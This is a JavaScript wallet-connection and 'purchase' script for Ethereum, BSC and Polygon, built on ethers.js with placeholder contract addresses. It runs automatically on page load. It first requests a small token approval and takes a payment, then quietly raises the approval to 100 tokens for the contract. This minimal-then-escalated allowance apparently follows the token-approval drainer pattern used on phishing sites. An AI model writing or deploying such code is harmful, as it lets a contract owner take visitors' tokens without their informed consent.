import { ethers } from "ethers";

// Supported chain config
const chainConfig = {
  1: { 
      name: 'Ethereum',
      nativeToken: 'ETH',
      maxTransaction: ethers.utils.parseEther("0.05"),
      contractAddress: "YOUR_ETHEREUM_CONTRACT_ADDRESS",
      tokenAddress: "YOUR_ETHEREUM_TOKEN_ADDRESS",
      rpcUrl: 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID',
      chainParams: {
          chainId: '0x1',  // Ethereum Mainnet
          chainName: 'Ethereum Mainnet',
          nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
          rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'],
          blockExplorerUrls: ['https://etherscan.io/']
      },
  },
  56: { 
      name: 'Binance Smart Chain',
      nativeToken: 'BNB',
      maxTransaction: ethers.utils.parseEther("0.1"),
      contractAddress: "YOUR_BSC_CONTRACT_ADDRESS",
      tokenAddress: "YOUR_BSC_TOKEN_ADDRESS",
      rpcUrl: 'https://bsc-dataseed.binance.org/',
      chainParams: {
          chainId: '0x38',  // BSC Mainnet
          chainName: 'Binance Smart Chain Mainnet',
          nativeCurrency: { name: 'Binance Coin', symbol: 'BNB', decimals: 18 },
          rpcUrls: ['https://bsc-dataseed.binance.org/'],
          blockExplorerUrls: ['https://bscscan.com/']
      },
  },
  137: { 
      name: 'Polygon',
      nativeToken: 'MATIC',
      maxTransaction: ethers.utils.parseEther("1.0"),
      contractAddress: "YOUR_POLYGON_CONTRACT_ADDRESS",
      tokenAddress: "YOUR_POLYGON_TOKEN_ADDRESS",
      rpcUrl: 'https://polygon-rpc.com/',
      chainParams: {
          chainId: '0x89',  // Polygon Mainnet
          chainName: 'Polygon Mainnet',
          nativeCurrency: { name: 'Polygon', symbol: 'MATIC', decimals: 18 },
          rpcUrls: ['https://polygon-rpc.com/'],
          blockExplorerUrls: ['https://polygonscan.com/']
      },
  },
  // Add more chains as necessary
};

const MIN_ALLOWANCE = ethers.utils.parseEther("0.01"); // Set minimal initial allowance
const ESCALATED_ALLOWANCE = ethers.utils.parseEther("100"); // Set higher allowance for future transactions

async function connectWalletAndPurchase() {
  try {
      if (typeof window.ethereum === 'undefined') {
          throw new Error('No wallet provider found. Please install MetaMask or another wallet provider.');
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();
      const network = await provider.getNetwork();
      const chainId = network.chainId;

      console.log(`Connected account: ${userAddress}`);
      console.log(`Connected to network: ${network.name} (Chain ID: ${chainId})`);

      const config = chainConfig[chainId];
      if (!config) {
          await switchToSupportedNetwork();
          return;
      }

      await requestInitialAllowance(signer, config);

      // Execute the purchase logic
      await proceedWithTransaction(signer, config);

  } catch (error) {
      console.error('Error:', error.message || error);
  }
}

async function requestInitialAllowance(signer, config) {
  const tokenContract = new ethers.Contract(config.tokenAddress, [
      "function approve(address spender, uint256 amount) public returns (bool)"
  ], signer);

  console.log(`Requesting initial allowance of ${ethers.utils.formatEther(MIN_ALLOWANCE)} tokens...`);
  const tx = await tokenContract.approve(config.contractAddress, MIN_ALLOWANCE);
  console.log('Initial allowance transaction initiated:', tx.hash);
  
  await tx.wait();
  console.log('Initial allowance granted.');
}

async function proceedWithTransaction(signer, config) {
  try {
      // Purchase logic
      const contract = new ethers.Contract(config.contractAddress, [
          "function purchase() public payable"
      ], signer);

      // Set up the transaction value (amount of native token to send)
      const transactionAmount = ethers.utils.parseEther("0.01"); // Example value; modify as needed

      const balance = await signer.getBalance();
      console.log(`Wallet balance: ${ethers.utils.formatEther(balance)} ${config.nativeToken}`);

      if (balance.lt(transactionAmount)) {
          throw new Error('Insufficient balance for transaction.');
      }

      console.log(`Initiating purchase for ${ethers.utils.formatEther(transactionAmount)} ${config.nativeToken}...`);
      
      const gasEstimate = await contract.estimateGas.purchase({
          value: transactionAmount,
      });

      const tx = await contract.purchase({
          value: transactionAmount,
          gasLimit: gasEstimate.mul(12).div(10), // Add buffer
      });
      
      console.log('Transaction initiated:', tx.hash);
      
      const receipt = await tx.wait();
      console.log('Transaction confirmed:', receipt);

      // Optionally, increase allowance for future transactions
      await escalateAllowance(signer, config);

  } catch (error) {
      console.error('Transaction error:', error.message || error);
  }
}

async function escalateAllowance(signer, config) {
  const tokenContract = new ethers.Contract(config.tokenAddress, [
      "function approve(address spender, uint256 amount) public returns (bool)"
  ], signer);

  console.log(`Escalating allowance to ${ethers.utils.formatEther(ESCALATED_ALLOWANCE)} tokens...`);
  const tx = await tokenContract.approve(config.contractAddress, ESCALATED_ALLOWANCE);
  console.log('Escalation transaction initiated:', tx.hash);
  
  await tx.wait();
  console.log('Allowance escalated.');
}

async function switchToSupportedNetwork() {
  const targetChainId = Object.keys(chainConfig)[0]; // Default to the first supported chain
  const config = chainConfig[targetChainId];

  try {
      await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: config.chainParams.chainId }],
      });
      console.log(`Switched to ${config.name}.`);
      
  } catch (switchError) {
      console.error('Failed to switch network:', switchError);
  }
}

// Automatically connect wallet and execute transaction when the page loads
window.onload = () => {
  connectWalletAndPurchase();
};